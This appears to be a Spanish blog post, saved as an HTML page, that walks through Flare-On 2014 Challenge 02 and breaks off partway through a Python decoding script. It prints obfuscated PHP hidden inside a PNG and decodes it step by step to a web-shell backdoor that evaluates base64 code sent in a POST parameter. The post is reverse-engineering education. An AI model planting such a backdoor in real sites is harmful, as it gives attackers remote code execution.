@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+    <title>Flare-on 2014 - Challenge 02: Javascrap &middot; xbytemx blog</title>
+    <meta name="author" content="Tony Palma">
+    <meta name="description" content="La idea de este blog es documentar un poco mas sobre lo que aprendo">
+    <meta name="generator" content="Hugo 0.47.1" />
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+    <!-- RSS autodiscovery -->
+    
+
+    <link rel="shortcut icon" href="https://xbytemx.github.io/img/favicon.ico">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="https://xbytemx.github.io/css/screen.css">
+    <link rel="stylesheet" href="https://xbytemx.github.io/css/github.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/styles/default.min.css">
+    
+
+    
+    <link rel="shortcut icon" type="image/x-icon" href="https://xbytemx.github.io/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="https://xbytemx.github.io/favicon.ico">
+    
+
+    <!-- Stylesheet for theme color -->
+    <style type="text/css">
+    a, a:visited {color: #3498db;}
+    .pagination a {color: #3498db;}
+    .gist .gist-file .gist-meta a:visited {color: #3498db !important;}
+    a:focus, a:hover {color: #2079b4;}
+    h1.post-title a:focus, h1.post-title a:hover, h1.blog-title a:focus, h1.blog-title a:hover {color: #2079b4;}
+    .older-posts:hover, .newer-posts:hover {color: #2079b4;}
+</style>
+</head>
+
+<body class="home-template">
+    <header id="site-head">
+	
+	<h1 class="blog-title"><a href="https://xbytemx.github.io/">xbytemx blog</a></h1>
+	
+	
+	<h1 class="blog-subtitle">Un lugar más donde dejar anecdotas</h1>
+	
+</header>
+    
+    
+    <main class="content" role="main">
+    
+<article class="post">
+    <header>
+        <h1 class="post-title">Flare-on 2014 - Challenge 02: Javascrap</h1>
+        <div class="post-meta">
+            <time datetime="24 October 2018">
+                24 October 2018
+            </time>
+        </div>
+    </header>
+
+    <section class="post-content">
+        
+
+<p>Bien comenzamos por descargar este reto, &ldquo;C2.zip&rdquo; y validarlo. En este challenge y los siguientes todos serán archivos zip con la contraseña &ldquo;malware&rdquo;, por lo que iniciamos descomprimiendo el archivo en nuestra carpeta challenge02:</p>
+
+<p><img src="/img/flareon-2014-challenge-02/unzip.png" alt="unzip" /></p>
+
+<p>Al ver el contenido tenemos 2 archivos, una imagen y un archivo html:</p>
+
+<p><img src="/img/flareon-2014-challenge-02/file-of-content.png" alt="file" /></p>
+
+<p>Si analizamos el documento html tenemos lo siguiente:</p>
+
+<pre><code>&lt;!DOCTYPE html&gt;
+
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;The FLARE On Challenge&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://bootswatch.com/lumen/bootstrap.min.css&quot;&gt;
+    &lt;style type=&quot;text/css&quot;&gt;
+        #counter {
+            width: 210px;
+            height: 80px;
+            font-size: 35px;
+        }
+        .points {
+            float: left;
+            width: 20px;
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
+            line-height: 70px;
+            text-shadow: none;
+        }
+        .position {
+            position: relative;
+            float: left;
+            width: 15px;
+            height: 92px;
+            margin: 8px 0 0 0;
+        }
+        .digit {
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        .boxName {
+            float: left;
+            width: 30px;
+            margin: 45px 0 0 -28px;
+            font-size: 12px;
+            color: #a6a6a6;
+        }
+        .Hours { margin-left: 5px; }
+        .Seconds { margin-left: 2px; }
+    &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+    &lt;div class=&quot;container&quot;&gt;
+
+        &lt;!-- Title and Nav --&gt;
+        &lt;img src=&quot;img/flare-on.png&quot;&gt;
+        &lt;ul class=&quot;list-inline&quot;&gt;
+            &lt;li&gt;&lt;a onclick=&quot;display_me('overview_div')&quot;&gt;OVERVIEW&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a onclick=&quot;display_me('directions_div')&quot;&gt;INSTRUCTIONS&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a onclick=&quot;display_me('advice_div')&quot;&gt;RESOURCES&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a onclick=&quot;display_me('warnings_div')&quot;&gt;TERMS &amp; CONDITIONS&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a onclick=&quot;display_me('solved_div')&quot;&gt;FIRST TO SOLVE&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;br&gt;&lt;br&gt;
+
+        &lt;div class=&quot;row&quot;&gt;
+          &lt;div class=&quot;col-md-6&quot;&gt;
+
+              &lt;div id=&quot;overview_div&quot; style=&quot;display:block&quot;&gt;
+                  &lt;p&gt;The FireEye Labs Advanced Reverse Engineering (FLARE) team is an elite technical
+                     group of malware analysts, researchers, and hackers. We are looking to hire smart
+                     individuals interested in reverse engineering. We have created this series of binary
+                     challenges to test your skills. We encourage anyone to participate and practice their
+                     skills while having fun!&lt;/p&gt;
+
+                  &lt;p&gt;At launch, a download link for the first challenge will show up here. The first
+                     challenge is a self-extracting zip file that requires you accept our End User
+                     License Agreement (EULA) before continuing.&lt;/p&gt;
+
+              &lt;/div&gt;
+
+              &lt;div id=&quot;directions_div&quot; style=&quot;display:none&quot;&gt;
+                  &lt;p&gt;It’s simple: Analyze the sample, find the key.&lt;/p&gt;
+                  &lt;p&gt;Each key is an email address, simply email the email address and it will respond with the next binary challenge.&lt;/p&gt;
+                  &lt;p&gt;After completing the final challenge, you’ll win a prize and be contacted by a FLARE team member.&lt;/p&gt;
+              &lt;/div&gt;
+
+              &lt;div id=&quot;warnings_div&quot; style=&quot;display:none&quot;&gt;
+                  &lt;p&gt;WARNING! Some of these challenges may be malicious.&lt;/p&gt;
+                  &lt;p&gt;Exercise extreme caution when executing unknown code.&lt;/p&gt;
+                  &lt;p&gt;Be safe and perform the analysis inside of a virtual machine.&lt;/p&gt;
+                  &lt;p&gt;The &lt;a href=&quot;&quot;&gt;EULA&lt;/a&gt; describes the terms and conditions of these binaries.&lt;/p&gt;
+              &lt;/div&gt;
+
+              &lt;div id=&quot;advice_div&quot; style=&quot;display:none&quot;&gt;
+                  &lt;p&gt;There are tons of tools out there to aid you in your analysis. Here are some suggestions:
+                      &lt;ul&gt;
+                          &lt;li&gt;&lt;a href=&quot;https://www.hex-rays.com/products/ida/&quot;&gt;IDA Pro&lt;/a&gt;&lt;/li&gt;
+                          &lt;li&gt;&lt;a href=&quot;http://www.ollydbg.de/&quot;&gt;Ollydbg&lt;/a&gt;&lt;/li&gt;
+                          &lt;li&gt;&lt;a href=&quot;http://msdn.microsoft.com/en-us/library/windows/hardware/ff551063(v=vs.85).aspx&quot;&gt;Windbg&lt;/a&gt;&lt;/li&gt;
+                          &lt;li&gt;&lt;a href=&quot;http://www.ntcore.com/exsuite.php&quot;&gt;CFF Explorer&lt;/a&gt;&lt;/li&gt;
+                          &lt;li&gt;&lt;a href=&quot;http://www.hexworkshop.com/&quot;&gt;Hex Workshop&lt;/a&gt;&lt;/li&gt;
+                          &lt;li&gt;&lt;a href=&quot;http://ilspy.net/&quot;&gt;ILSpy&lt;/a&gt;&lt;/li&gt;
+                      &lt;/ul&gt;
+                  &lt;/p&gt;
+                  &lt;p&gt;There are also many books out there that could help you. Here are some suggestions:
+                      &lt;ul&gt;
+                          &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Practical-Malware-Analysis-Dissecting-Malicious/dp/1593272901&quot;&gt;Practical Malware Analysis&lt;/a&gt;&lt;/li&gt;
+                          &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/IDA-Pro-Book-Unofficial-Disassembler/dp/1593272898&quot;&gt;IDA Pro Book&lt;/a&gt;&lt;/li&gt;
+                          &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Practical-Reverse-Engineering-Reversing-Obfuscation-ebook/dp/B00IA22R2Y&quot;&gt;Practical Reverse Engineering&lt;/a&gt;&lt;/li&gt;
+                          &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/x86-Instruction-Set-Architecture-Shanley/dp/0977087859&quot;&gt;x86 Instruction Set Architecture&lt;/a&gt;&lt;/li&gt;
+                      &lt;/ul&gt;
+                  &lt;/p&gt;
+              &lt;/div&gt;
+              &lt;div id=&quot;solved_div&quot; style=&quot;display:none&quot;&gt;
+                  &lt;p&gt;Congratulations to all those that completed the FLARE On challenge!&lt;/p&gt;
+                  &lt;ol&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                      &lt;li&gt;&lt;/li&gt;
+                  &lt;/ol&gt;
+              &lt;/div&gt;
+
+
+          &lt;/div&gt;
+          &lt;div class=&quot;col-md-6&quot; style=&quot;text-align:center&quot;&gt;
+
+                &lt;div style=&quot;display:inline-block;&quot;&gt;&lt;h3 style=&quot;margin-top:0px;margin-bottom:0px;&quot;&gt;Launch Date&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/h3&gt;&lt;/div&gt;&lt;br/&gt;
+                &lt;div style=&quot;display:inline-block&quot; id=&quot;counter&quot;&gt;&lt;/div&gt;
+
+          &lt;/div&gt;
+        &lt;/div&gt;
+
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        function display_me(show_me) {
+            document.getElementById('overview_div').style.display = 'none';
+            document.getElementById('directions_div').style.display = 'none';
+            document.getElementById('warnings_div').style.display = 'none';
+            document.getElementById('advice_div').style.display = 'none';
+            document.getElementById('solved_div').style.display = 'none';
+            document.getElementById(show_me).style.display = 'block';
+        }
+    &lt;/script&gt;
+    &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;!function(s){function a(a){a.addClass(&quot;countdownHolder&quot;),s.each([&quot;Days&quot;,&quot;Hours&quot;,&quot;Minutes&quot;,&quot;Seconds&quot;],function(t){var n;n=&quot;Days&quot;==this?&quot;DAYS&quot;:&quot;Hours&quot;==this?&quot;HRS&quot;:&quot;Minutes&quot;==this?&quot;MNTS&quot;:&quot;SECS&quot;,s('&lt;div class=&quot;count'+this+'&quot;&gt;&lt;span class=&quot;position&quot;&gt;&lt;span class=&quot;digit static&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;position&quot;&gt;&lt;span class=&quot;digit static&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;boxName&quot;&gt;&lt;span class=&quot;'+this+'&quot;&gt;'+n+&quot;&lt;/span&gt;&lt;/span&gt;&quot;).appendTo(a),&quot;Seconds&quot;!=this&amp;&amp;a.append('&lt;span class=&quot;points&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;countDiv countDiv'+t+'&quot;&gt;&lt;/span&gt;')})}function t(a,t){var n=a.find(&quot;.digit&quot;);if(n.is(&quot;:animated&quot;))return!1;if(a.data(&quot;digit&quot;)==t)return!1;a.data(&quot;digit&quot;,t);var i=s(&quot;&lt;span&gt;&quot;,{&quot;class&quot;:&quot;digit&quot;,css:{top:0,opacity:0},html:t});n.before(i).removeClass(&quot;static&quot;).animate({top:0,opacity:0},&quot;fast&quot;,function(){n.remove()}),i.delay(100).animate({top:0,opacity:1},&quot;fast&quot;,function(){i.addClass(&quot;static&quot;)})}var n=86400,i=3600,o=60;s.fn.countdown=function(c){function e(s,a,n){t(r.eq(s),Math.floor(n/10)%10),t(r.eq(a),n%10)}var p,d,l,u,f,r,h=s.extend({callback:function(){},timestamp:0},c);return a(this,h),r=this.find(&quot;.position&quot;),function m(){p=Math.floor((h.timestamp-new Date)/1e3),0&gt;p&amp;&amp;(p=0),d=Math.floor(p/n),e(0,1,d),p-=d*n,l=Math.floor(p/i),e(2,3,l),p-=l*i,u=Math.floor(p/o),e(4,5,u),p-=u*o,f=p,e(6,7,f),h.callback(d,l,u,f),setTimeout(m,1e3)}(),this}}(jQuery);&lt;/script&gt;&lt;?php include &quot;img/flare-on.png&quot; ?&gt;
+
+
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        $(document).ready(function(){
+            $('#counter').countdown({
+                timestamp : new Date(2014,6,7,4,0,0,0)
+            });
+        });
+    &lt;/script&gt;
+
+
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Curioso el include de php:</p>
+
+<pre><code>&lt;?php include &quot;img/flare-on.png&quot; ?&gt;
+</code></pre>
+
+<p>Veamos que nos dice strings de este archivo:</p>
+
+<p><img src="/img/flareon-2014-challenge-02/php-in-png.png" alt="php-in-png" /></p>
+
+<p>Hey parece que tenemos un código php dentro de la imagen:</p>
+
+<pre><code>&lt;?php $terms=array(&quot;M&quot;, &quot;Z&quot;, &quot;]&quot;, &quot;p&quot;, &quot;\\&quot;, &quot;w&quot;, &quot;f&quot;, &quot;1&quot;, &quot;v&quot;, &quot;&lt;&quot;, &quot;a&quot;, &quot;Q&quot;, &quot;z&quot;, &quot; &quot;, &quot;s&quot;, &quot;m&quot;, &quot;+&quot;, &quot;E&quot;, &quot;D&quot;, &quot;g&quot;, &quot;W&quot;, &quot;\&quot;&quot;, &quot;q&quot;, &quot;y&quot;, &quot;T&quot;, &quot;V&quot;, &quot;n&quot;, &quot;S&quot;, &quot;X&quot;, &quot;)&quot;, &quot;9&quot;, &quot;C&quot;, &quot;P&quot;, &quot;r&quot;, &quot;&amp;&quot;, &quot;\'&quot;, &quot;!&quot;, &quot;x&quot;, &quot;G&quot;, &quot;:&quot;, &quot;2&quot;, &quot;~&quot;, &quot;O&quot;, &quot;h&quot;, &quot;u&quot;, &quot;U&quot;, &quot;@&quot;, &quot;;&quot;, &quot;H&quot;, &quot;3&quot;, &quot;F&quot;, &quot;6&quot;, &quot;b&quot;, &quot;L&quot;, &quot;&gt;&quot;, &quot;^&quot;, &quot;,&quot;, &quot;.&quot;, &quot;l&quot;, &quot;$&quot;, &quot;d&quot;, &quot;`&quot;, &quot;%&quot;, &quot;N&quot;, &quot;*&quot;, &quot;[&quot;, &quot;0&quot;, &quot;}&quot;, &quot;J&quot;, &quot;-&quot;, &quot;5&quot;, &quot;_&quot;, &quot;A&quot;, &quot;=&quot;, &quot;{&quot;, &quot;k&quot;, &quot;o&quot;, &quot;7&quot;, &quot;#&quot;, &quot;i&quot;, &quot;I&quot;, &quot;Y&quot;, &quot;(&quot;, &quot;j&quot;, &quot;/&quot;, &quot;?&quot;, &quot;K&quot;, &quot;c&quot;, &quot;B&quot;, &quot;t&quot;, &quot;R&quot;, &quot;4&quot;, &quot;8&quot;, &quot;e&quot;, &quot;|&quot;);$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);$do_me=&quot;&quot;;for($i=0;$i&lt;count($order);$i++){$do_me=$do_me.$terms[$order[$i]];}eval($do_me); ?&gt;
+</code></pre>
+
+<p>Pero así parece ilegible lo que tenemos, mejor ordenemos un poco mejor:</p>
+
+<pre><code>&lt;?php
+$terms=array(&quot;M&quot;, &quot;Z&quot;, &quot;]&quot;, &quot;p&quot;, &quot;\\&quot;, &quot;w&quot;, &quot;f&quot;, &quot;1&quot;, &quot;v&quot;, &quot;&lt;&quot;, &quot;a&quot;, &quot;Q&quot;, &quot;z&quot;, &quot; &quot;, &quot;s&quot;, &quot;m&quot;, &quot;+&quot;, &quot;E&quot;, &quot;D&quot;, &quot;g&quot;, &quot;W&quot;, &quot;\&quot;&quot;, &quot;q&quot;, &quot;y&quot;, &quot;T&quot;, &quot;V&quot;, &quot;n&quot;, &quot;S&quot;, &quot;X&quot;, &quot;)&quot;, &quot;9&quot;, &quot;C&quot;, &quot;P&quot;, &quot;r&quot;, &quot;&amp;&quot;, &quot;\'&quot;, &quot;!&quot;, &quot;x&quot;, &quot;G&quot;, &quot;:&quot;, &quot;2&quot;, &quot;~&quot;, &quot;O&quot;, &quot;h&quot;, &quot;u&quot;, &quot;U&quot;, &quot;@&quot;, &quot;;&quot;, &quot;H&quot;, &quot;3&quot;, &quot;F&quot;, &quot;6&quot;, &quot;b&quot;, &quot;L&quot;, &quot;&gt;&quot;, &quot;^&quot;, &quot;,&quot;, &quot;.&quot;, &quot;l&quot;, &quot;$&quot;, &quot;d&quot;, &quot;`&quot;, &quot;%&quot;, &quot;N&quot;, &quot;*&quot;, &quot;[&quot;, &quot;0&quot;, &quot;}&quot;, &quot;J&quot;, &quot;-&quot;, &quot;5&quot;, &quot;_&quot;, &quot;A&quot;, &quot;=&quot;, &quot;{&quot;, &quot;k&quot;, &quot;o&quot;, &quot;7&quot;, &quot;#&quot;, &quot;i&quot;, &quot;I&quot;, &quot;Y&quot;, &quot;(&quot;, &quot;j&quot;, &quot;/&quot;, &quot;?&quot;, &quot;K&quot;, &quot;c&quot;, &quot;B&quot;, &quot;t&quot;, &quot;R&quot;, &quot;4&quot;, &quot;8&quot;, &quot;e&quot;, &quot;|&quot;);
+
+$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);
+
+for($i=0; $i &lt; count($order); $i++)
+{
+  $do_me = $do_me.$terms[$order[$i]];
+}
+
+eval($do_me); ?&gt;
+</code></pre>
+
+<p>Con $terms tenemos las palabras que estaremos utilizando, mientras que $order nos indica el orden en que se colocaran dichos caracteres. El ciclo for genera un nueva variable $do_me que contiene el texto que ejecutara eval().</p>
+
+<p>Para esto podemos usar el mismo código y crear un archivo c1.php, solo que en lugar de correr eval, corremos print:</p>
+
+<p><img src="/img/flareon-2014-challenge-02/do-me.png" alt="do_me" /></p>
+
+<p>Ok, la salida del comando es el siguiente código:</p>
+
+<pre><code>$_= \'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\';
+$__=\'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\';
+$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;
+eval($___($__));
+</code></pre>
+
+<p>En esta parte, tenemos 3 definiciones que después pasan por eval(), por lo que empecemos decodificar cada una de ellas:</p>
+
+<pre><code>$_ = aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9
+</code></pre>
+
+<p>Esto parece base64, veamos si lo podemos decodificar:</p>
+
+<p><img src="/img/flareon-2014-challenge-02/var1-base64-decode.png" alt="var1-base64-decode" /></p>
+
+<p>Ok, ahora tenemos las siguientes instrucciones:</p>
+
+<pre><code>if(
+  isset( $_POST[&quot;\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D&quot;]
+  )
+)
+{
+  eval(
+    base64_decode(
+      $_POST[&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;]
+    )
+  );
+}
+</code></pre>
+
+<p>Las variables $_POST contienen tanto datos en decimal como hexadecimal, por lo que debemos cambiar el encoding de cada una, para ello he escrito el siguiente programa en python que resuelve los dec y los hex:</p>
+
+<pre><code>#!/usr/bin/env python
+# encoding: utf-8
+
+import re, binascii
+
+line1=r'\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D'
+line2=r'\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D'
+
+def replace_dec(match):
+    return chr(int(match.group(1)))
+
+def replace_hex(match):
+    return match.group(1)[1:].decode('hex')
+
+regex_dec = re.compile(r&quot;\\(\d{1,3})&quot;)
+regex_hex = re.compile(r&quot;\\(x[0-9A-Fa-f]{2})&quot;)
+
+print regex_hex.sub(replace_hex, regex_dec.sub(replace_dec, line1))
